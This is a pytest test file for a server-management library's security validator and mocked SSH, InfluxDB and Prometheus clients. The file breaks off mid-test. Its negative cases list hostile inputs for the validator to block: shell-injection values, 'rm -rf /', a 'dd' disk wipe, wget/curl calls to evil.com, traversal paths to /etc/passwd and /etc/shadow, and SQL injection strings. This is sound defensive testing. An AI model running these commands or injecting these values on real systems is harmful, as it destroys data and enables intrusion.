"""
Tests for server-management-lib

Covers:
- Configuration loading
- Security validation (device names, service names, commands, queries, paths)
- SSH manager (mocked)
- HTTP clients (mocked)
"""

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import aiohttp
import pytest

from server_management_lib.config import DEFAULT_CONFIG, load_config
from server_management_lib.http_clients import InfluxDBClient, PrometheusClient
from server_management_lib.security import SecurityValidator
from server_management_lib.ssh_manager import SSHManager

# ============================================================================
# Configuration Tests
# ============================================================================


class TestConfiguration:
    """Test configuration loading."""

    def test_default_config_has_all_sections(self):
        """Default config must have all expected sections."""
        assert "ssh" in DEFAULT_CONFIG
        assert "security" in DEFAULT_CONFIG
        assert "host" in DEFAULT_CONFIG
        assert "influxdb" in DEFAULT_CONFIG
        assert "prometheus" in DEFAULT_CONFIG

    def test_default_security_settings(self):
        """Generic command execution must be disabled by default."""
        assert DEFAULT_CONFIG["security"]["allow_generic_commands"] is False

    def test_load_example_config(self):
        """Example config file should load without error."""
        example_path = Path(__file__).parent.parent / "config.example.yaml"
        if example_path.exists():
            config = load_config(example_path)
            assert "ssh" in config
            assert "security" in config


# ============================================================================
# Security - Device Name Validation
# ============================================================================


class TestDeviceNameValidation:
    """Test block device name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = ["sda", "sdb", "nvme0n1", "nvme1n2", "vda", "hda", "mmcblk0", "dm-0"]
        for name in valid:
            assert self.security.validate_device_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "sda;rm -rf /",
            "sda$(whoami)",
            "../../etc",
            "/dev/sda",
            "a" * 33,
            None,
        ]
        for name in invalid:
            assert self.security.validate_device_name(name) is False  # type: ignore[arg-type]


# ============================================================================
# Security - Service Name Validation
# ============================================================================


class TestServiceNameValidation:
    """Test service name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = [
            "myapp",
            "my-app",
            "my_app",
            "MyApp123",
            "service-01",
            "a",
            "a" * 100,
        ]
        for name in valid:
            assert self.security.validate_service_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "my app",
            "my/app",
            "../etc",
            "app;rm -rf /",
            "-help",
            "_service",
            None,
        ]
        for name in invalid:
            assert self.security.validate_service_name(name) is False  # type: ignore[arg-type]


# ============================================================================
# Security - Command Safety
# ============================================================================


class TestCommandSafety:
    """Test command safety validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_disk_safe_commands_accepted(self):
        """Disk diagnostic commands must pass the whitelist."""
        safe = [
            "smartctl -a /dev/sda",
            "smartctl -j -a /dev/sda",
            "smartctl -t short /dev/sda 2>&1",
            "smartctl -t long /dev/sda 2>&1",
            "lsblk -d -o NAME,MODEL,SERIAL,SIZE,TYPE,TRAN --json 2>&1",
            "zpool status -x 2>&1 && echo '---' && zpool list -o name,size 2>&1",
            "cat /proc/mdstat 2>&1 && echo '---' && mdadm --detail --scan 2>&1",
            "iostat -x 1 1 2>&1",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_general_safe_commands_accepted(self):
        """General safe commands (non-disk whitelist) must pass."""
        safe = [
            "docker ps",
            "docker logs myapp",
            "uptime",
            "free -h",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_dangerous_commands_blocked(self):
        """Dangerous commands must always be blocked."""
        dangerous = [
            "sudo smartctl -a /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "rm -rf /",
            "bash /tmp/evil.sh",
            "wget http://evil.com/malware",
            "curl http://evil.com/exploit",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"

    def test_redirect_outside_2and1_blocked(self):
        """Output redirection (except 2>&1) must be blocked for disk commands."""
        dangerous = [
            "smartctl -a /dev/sda > /dev/sda",
            "smartctl -j -a /dev/sda > /tmp/evil",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False


# ============================================================================
# Security - File Path Validation
# ============================================================================


class TestFilePathValidation:
    """Test service file path validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_paths(self):
        valid = [
            ("myapp", "docker-compose.yml"),
            ("myapp", "config/app.conf"),
            ("myapp", "logs/app.log"),
        ]
        for service, path in valid:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"

    def test_traversal_blocked(self):
        attacks = [
            ("myapp", "../etc/passwd"),
            ("myapp", "../../etc/shadow"),
            ("myapp", "/etc/passwd"),
        ]
        for service, path in attacks:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block: {path}"

    def test_sensitive_files_blocked(self):
        sensitive = [
            ("myapp", ".env"),
            ("myapp", "secrets/password.txt"),
            ("myapp", "keys/server.key"),
        ]
        for service, path in sensitive:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block sensitive file: {path}"


# ============================================================================
# Security - Query Validation
# ============================================================================


class TestInfluxDBQueryValidation:
    """Test InfluxDB SQL query validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_queries(self):
        valid = [
            "SELECT * FROM cpu WHERE time > now() - INTERVAL '1 hour' LIMIT 5",
            "SELECT mean(value) FROM metrics GROUP BY host",
        ]
        for q in valid:
            assert self.security.validate_influxdb_query(q) is not None

    def test_write_ops_blocked(self):
        write_ops = [
            "DROP MEASUREMENT cpu",
            "DELETE FROM metrics",
            "INSERT INTO cpu VALUES (1)",
        ]
        for q in write_ops:
            assert self.security.validate_influxdb_query(q) is None

    def test_injection_blocked(self):
        injections = [
            "SELECT * FROM cpu; DROP TABLE metrics",
            "SELECT * FROM cpu -- comment",
            "SELECT * FROM cpu `whoami`",
        ]
        for q in injections:
            assert self.security.validate_influxdb_query(q) is None


class TestPrometheusQueryValidation:
    """Test PromQL query validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_queries(self):
        valid = [
            "up",
            "rate(http_requests_total[5m])",
        ]
        for q in valid:
            assert self.security.validate_prometheus_query(q) is not None

    def test_injection_blocked(self):
        injections = [
            "up; cat /etc/passwd",
            "`whoami`",
            "$(rm -rf /)",
            "up{job='test'}",
        ]
        for q in injections:
            assert self.security.validate_prometheus_query(q) is None


# ============================================================================
# Security - Search Pattern Sanitization
# ============================================================================


class TestSearchPatternSanitization:
    """Test search pattern sanitization."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_safe_patterns_preserved(self):
        safe = ["error", "connection failed", "timeout", "192.168.1.1"]
        for p in safe:
            assert self.security.sanitize_search_pattern(p) == p

    def test_dangerous_patterns_sanitized(self):
        result = self.security.sanitize_search_pattern("'; rm -rf /")
        assert "'" not in result
        assert ";" not in result

    def test_empty_pattern_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern("';|&$")


# ============================================================================
# SSH Manager (Mocked)
# ============================================================================


class TestSSHManagerMock:
    """Test SSHManager with mocked connections."""

    @pytest.fixture
    def config(self):
        return {
            "ssh": {
                "host": "localhost",
                "port": 22,
                "username": "test",
                "key_path": None,
            },
            "security": {"services_path": "/srv"},
        }

    @pytest.fixture
    def security(self, config):
        return SecurityValidator(config)

    def test_manager_created(self, config, security):
        manager = SSHManager(config, security)
        assert manager.connection is None
        assert manager._connected is False

    def test_connect_failure(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            with patch("server_management_lib.ssh_manager.asyncssh.connect") as mock:
                mock.side_effect = Exception("Connection refused")
                with pytest.raises(Exception, match="Connection refused"):
                    await manager.connect()

        asyncio.run(run())

    def test_execute_safe_command(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.return_value = MagicMock(
                stdout="hello", stderr="", exit_status=0
            )
            manager.connection = mock_conn

            result = await manager.execute_safe_command("echo hello")
            assert "hello" in result

        asyncio.run(run())

    def test_unsafe_command_blocked(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True
            manager.connection = AsyncMock()

            result = await manager.execute_safe_command("rm -rf /")
            assert "Security violation" in result or "❌" in result

        asyncio.run(run())


# ============================================================================
# HTTP Clients (Mocked)
# ============================================================================


class TestInfluxDBClientMock:
    """Test InfluxDBClient with mocked HTTP responses."""

    def test_no_database_error(self):
        client = InfluxDBClient(host="localhost", database=None)

        async def run():
            result = await client.query("SELECT * FROM cpu")
            assert "No database" in result

        asyncio.run(run())

    def test_query_success(self):
        client = InfluxDBClient(host="localhost", database="testdb", token="fake-token")

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value=[{"time": "2024-01-01"}])

            mock_cm = AsyncMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.post.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("SELECT * FROM cpu LIMIT 1")
                assert "Query successful" in result

        asyncio.run(run())


class TestPrometheusClientMock:
    """Test PrometheusClient with mocked HTTP responses."""

    def test_query_success(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={"status": "success", "data": {"resultType": "vector"}}
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("up")
                assert "Query successful" in result

        asyncio.run(run())

    def test_query_with_time_parameter(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={"status": "success", "data": {"resultType": "vector"}}
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("up", time="2024-01-01T00:00:00Z")
                assert "Query successful" in result

        asyncio.run(run())

    def test_query_error_response(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={
                    "status": "error",
                    "errorType": "bad_data",
                    "error": "Invalid query",
                }
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("invalid{")
                assert "PromQL query error" in result
                assert "bad_data" in result

        asyncio.run(run())

    def test_query_http_error(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 500
            mock_response.text = AsyncMock(return_value="Internal server error")

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("up")
                assert "HTTP 500" in result

        asyncio.run(run())

    def test_query_connection_error(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_session = MagicMock()
            mock_session.get.side_effect = aiohttp.ClientError("Connection refused")
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("up")
                assert "Connection error" in result

        asyncio.run(run())

    def test_query_timeout(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_session = MagicMock()
            mock_session.get.side_effect = TimeoutError()
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("up")
                assert "timed out" in result

        asyncio.run(run())

    def test_get_targets_success(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={
                    "status": "success",
                    "data": {
                        "activeTargets": [
                            {
                                "labels": {"job": "node", "instance": "localhost:9100"},
                                "health": "up",
                                "lastError": "",
                            }
                        ]
                    },
                }
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "Found 1 active targets" in result
                assert "node/localhost:9100: up" in result

        asyncio.run(run())

    def test_get_targets_empty(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={"status": "success", "data": {"activeTargets": []}}
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "No active targets" in result

        asyncio.run(run())

    def test_get_targets_with_error(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={
                    "status": "success",
                    "data": {
                        "activeTargets": [
                            {
                                "labels": {"job": "node", "instance": "localhost:9100"},
                                "health": "down",
                                "lastError": "connection refused",
                            }
                        ]
                    },
                }
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "connection refused" in result

        asyncio.run(run())

    def test_get_targets_http_error(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 500
            mock_response.text = AsyncMock(return_value="Server error")

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "HTTP 500" in result

        asyncio.run(run())

    def test_get_targets_connection_error(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_session = MagicMock()
            mock_session.get.side_effect = aiohttp.ClientError("Connection refused")
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "Connection error" in result

        asyncio.run(run())

    def test_get_targets_timeout(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_session = MagicMock()
            mock_session.get.side_effect = TimeoutError()
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "timed out" in result

        asyncio.run(run())

    def test_https_scheme(self):
        client = PrometheusClient(host="localhost", port=9090, use_https=True)
        assert client.scheme == "https"

    def test_with_token(self):
        client = PrometheusClient(host="localhost", port=9090, token="test-token")
        assert client.token == "test-token"

    def test_query_with_token_header(self):
        """Token should be added to the Authorization header."""
        client = PrometheusClient(host="localhost", port=9090, token="test-token")

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={"status": "success", "data": {"resultType": "vector"}}
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("up")
                assert "Query successful" in result
                # Verify headers were set
                call_args = mock_session.get.call_args
                assert call_args is not None
                headers = call_args[1].get("headers", {})
                assert headers.get("Authorization") == "Bearer test-token"

        asyncio.run(run())

    def test_get_targets_with_token_header(self):
        """Token should be added to the Authorization header."""
        client = PrometheusClient(host="localhost", port=9090, token="test-token")

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={
                    "status": "success",
                    "data": {"activeTargets": []},
                }
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "No active targets" in result
                # Verify headers were set
                call_args = mock_session.get.call_args
                assert call_args is not None
                headers = call_args[1].get("headers", {})
                assert headers.get("Authorization") == "Bearer test-token"

        asyncio.run(run())

    def test_get_targets_unexpected_response(self):
        """Should handle unexpected JSON responses gracefully."""
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value={"status": "error", "data": {}})

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.get_targets()
                assert "Unexpected response" in result

        asyncio.run(run())


# ============================================================================
# Additional Config Tests
# ============================================================================


class TestConfigLoading:
    """Test config loading edge cases."""

    def test_load_nonexistent_config(self):
        """Loading non-existent config should return defaults."""
        result = load_config(Path("/nonexistent/path/config.yaml"))
        assert result == DEFAULT_CONFIG.copy()

    def test_load_invalid_yaml(self, tmp_path):
        """Loading invalid YAML should return defaults."""
        config_file = tmp_path / "config.yaml"
        config_file.write_text("invalid: yaml: content: [")

        result = load_config(config_file)
        assert result == DEFAULT_CONFIG.copy()

    def test_load_valid_config(self, tmp_path):
        """Loading valid config should override defaults."""
        config_file = tmp_path / "config.yaml"
        config_content = """
ssh:
  host: example.com
  port: 2222
security:
  services_path: /custom/srv
"""
        config_file.write_text(config_content)

        result = load_config(config_file)
        assert result["ssh"]["host"] == "example.com"
        assert result["ssh"]["port"] == 2222
        assert result["security"]["services_path"] == "/custom/srv"


# ============================================================================
# Additional InfluxDB Tests
# ============================================================================


class TestInfluxDBClientExtended:
    """Test InfluxDBClient extended functionality."""

    def test_query_limit_capped(self):
        """Query limit should be capped at 10000."""
        client = InfluxDBClient(host="localhost", database="testdb", query_limit=50000)
        assert client.query_limit == 10000

    def test_query_limit_respected(self):
        """Query limit should respect the provided value."""
        client = InfluxDBClient(host="localhost", database="testdb", query_limit=500)
        assert client.query_limit == 500

    def test_https_scheme(self):
        client = InfluxDBClient(host="localhost", database="testdb", use_https=True)
        assert client.scheme == "https"

    def test_query_with_token_auth(self):
        client = InfluxDBClient(host="localhost", database="testdb", token="test-token")
        assert client.token == "test-token"

    def test_query_http_error_with_time_filter_hint(self):
        """HTTP errors should not show time filter hint if query has time filter."""
        client = InfluxDBClient(host="localhost", database="testdb")

        async def run():
            mock_response = MagicMock()
            mock_response.status = 500
            mock_response.text = AsyncMock(return_value="Internal error")

            mock_cm = AsyncMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.post.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query(
                    "SELECT * FROM cpu WHERE time > now() - INTERVAL '1 hour'"
                )
                assert "Tip: InfluxDB 3 Core" not in result

        asyncio.run(run())

    def test_query_http_error_without_time_filter(self):
        """HTTP errors should show time filter hint if query lacks time filter."""
        client = InfluxDBClient(host="localhost", database="testdb")

        async def run():
            mock_response = MagicMock()
            mock_response.status = 500
            mock_response.text = AsyncMock(return_value="Internal error")

            mock_cm = AsyncMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.post.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("SELECT * FROM cpu")
                assert "Tip: InfluxDB 3 Core" in result

        asyncio.run(run())

    def test_query_connection_error(self):
        client = InfluxDBClient(host="localhost", database="testdb")

        async def run():
            mock_session = MagicMock()
            mock_session.post.side_effect = aiohttp.ClientError("Connection refused")
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("SELECT * FROM cpu")
                assert "Connection error" in result

        asyncio.run(run())

    def test_query_timeout(self):
        client = InfluxDBClient(host="localhost", database="testdb")

        async def run():
            mock_session = MagicMock()
            mock_session.post.side_effect = TimeoutError()
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("SELECT * FROM cpu")
                assert "timed out" in result

        asyncio.run(run())


# ============================================================================
# Additional Security Tests
# ============================================================================


class TestSecurityEdgeCases:
    """Test edge cases for security validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_device_name_none_input(self):
        assert self.security.validate_device_name(None) is False

    def test_device_name_empty_input(self):
        assert self.security.validate_device_name("") is False

    def test_device_name_too_long(self):
        assert self.security.validate_device_name("a" * 33) is False

    def test_device_name_injection_patterns(self):
        injection_patterns = [
            "sda;rm -rf /",
            "sda$(whoami)",
            "sda`whoami`",
            "sda|cat /etc/passwd",
        ]
        for name in injection_patterns:
            assert self.security.validate_device_name(name) is False

    def test_service_name_none_input(self):
        assert self.security.validate_service_name(None) is False

    def test_service_name_empty_input(self):
        assert self.security.validate_service_name("") is False

    def test_service_name_too_long(self):
        assert self.security.validate_service_name("a" * 101) is False

    def test_file_path_none_input(self):
        result = self.security.validate_service_file_path("myapp", None)
        assert result is None

    def test_file_path_empty_input(self):
        result = self.security.validate_service_file_path("myapp", "")
        assert result is None

    def test_file_path_too_long(self):
        result = self.security.validate_service_file_path("myapp", "a" * 501)
        assert result is None

    def test_file_path_null_byte(self):
        result = self.security.validate_service_file_path("myapp", "file\x00.txt")
        assert result is None

    def test_file_path_url_encoded_traversal(self):
        result = self.security.validate_service_file_path("myapp", "%2e%2e/etc/passwd")
        assert result is None

    def test_file_path_unicode_variants(self):
        result = self.security.validate_service_file_path("myapp", "\uff0e\uff0e/etc")
        assert result is None

    def test_file_path_absolute_path_rejected(self):
        result = self.security.validate_service_file_path("myapp", "/etc/passwd")
        assert result is None

    def test_file_path_resolution_escape_symlink(self):
        """Test path that escapes via resolution."""
        # Create a path that escapes the base directory
        result = self.security.validate_service_file_path("myapp", "../../etc/passwd")
        assert result is None

    def test_file_path_resolution_exception_handling(self):
        """Test that path resolution exceptions are handled."""
        # This should trigger an exception in Path.resolve()
        # We can't easily trigger this, but we can test with a very long path
        result = self.security.validate_service_file_path("myapp", "a" * 400)
        # Either None (blocked by length) or handled gracefully
        assert result is None or isinstance(result, str)

    def test_service_file_path_valid_scenarios(self):
        """Test various valid file paths."""
        valid_paths = [
            ("myapp", "docker-compose.yml"),
            ("myapp", "config.yaml"),
            ("myapp", "subdir/file.txt"),
        ]
        for service, path in valid_paths:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"
            assert "/srv/myapp/" in result

    def test_smart_test_type_validation(self):
        assert self.security.validate_smart_test_type("short") is True
        assert self.security.validate_smart_test_type("long") is True
        assert self.security.validate_smart_test_type("conveyance") is True
        assert self.security.validate_smart_test_type("invalid") is False
        assert self.security.validate_smart_test_type("") is False
        assert self.security.validate_smart_test_type(None) is False

    def test_influxdb_query_none_input(self):
        assert self.security.validate_influxdb_query(None) is None

    def test_influxdb_query_empty_input(self):
        assert self.security.validate_influxdb_query("") is None

    def test_influxdb_query_too_long(self):
        assert self.security.validate_influxdb_query("SELECT " + "a" * 5000) is None

    def test_influxdb_query_not_select(self):
        assert (
            self.security.validate_influxdb_query("INSERT INTO cpu VALUES (1)") is None
        )

    def test_prometheus_query_none_input(self):
        assert self.security.validate_prometheus_query(None) is None

    def test_prometheus_query_empty_input(self):
        assert self.security.validate_prometheus_query("") is None

    def test_prometheus_query_too_long(self):
        assert self.security.validate_prometheus_query("up" + "a" * 5000) is None

    def test_search_pattern_none_input(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern(None)

    def test_search_pattern_empty_input(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern("")

    def test_search_pattern_non_string_input(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern(123)  # type: ignore[arg-type]

    def test_search_pattern_becomes_empty_after_sanitization(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern("';|&$")

    def test_search_pattern_truncated(self):
        long_pattern = "a" * 300
        result = self.security.sanitize_search_pattern(long_pattern)
        assert len(result) <= 200

    def test_command_safety_output_redirection_blocked(self):
        """Output redirection (except 2>&1) should be blocked for disk commands."""
        dangerous = [
            "smartctl -a /dev/sda > /tmp/output",
            "smartctl -j -a /dev/sda > /dev/null",
            "nvme smart-log /dev/nvme0n1 > /tmp/output",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False

    def test_command_safety_2and1_redirect_allowed(self):
        """2>&1 redirect should be allowed for disk commands."""
        safe = [
            "smartctl -a /dev/sda 2>&1",
            "nvme smart-log /dev/nvme0n1 2>&1",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True

    def test_command_safety_shell_chaining_allowed(self):
        """Shell chaining (&&, ||) should be allowed for disk commands."""
        safe = [
            "smartctl -a /dev/sda && echo success",
            "lsblk -d || echo failed",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True

    def test_device_name_injection_pattern_injection(self):
        """Device names with injection patterns should be blocked."""
        # Test each injection pattern
        injection_patterns = [
            "sda;rm",  # semicolon
            "sda|cat",  # pipe
            "sda`whoami`",  # command substitution
            "sda$var",  # variable expansion
            "sda(sub)",  # subshell
            "sda{braces}",  # brace expansion
            "sda<redirect",  # redirect
            "sda\\nescape",  # escape
            "sda'quote",  # quote
            'sda"quote',  # quote
            "sda!hist",  # history
            "sda~home",  # home
            "sda..traversal",  # path traversal
        ]
        for name in injection_patterns:
            assert self.security.validate_device_name(name) is False, (
                f"Should block: {name}"
            )

    def test_service_name_path_traversal_patterns(self):
        """Service names with path traversal patterns should be blocked."""
        traversal_patterns = [
            "myapp..",  # parent directory
            "my~app",  # home directory
            "my$app",  # variable expansion
            "my`app",  # command substitution
            "my;app",  # command separator
            "my|app",  # pipe
            "my&app",  # background
            "my>app",  # redirect
            "my<app",  # redirect input
            "my(app)",  # subshell
            "my{app}",  # brace expansion
            "my[app]",  # glob
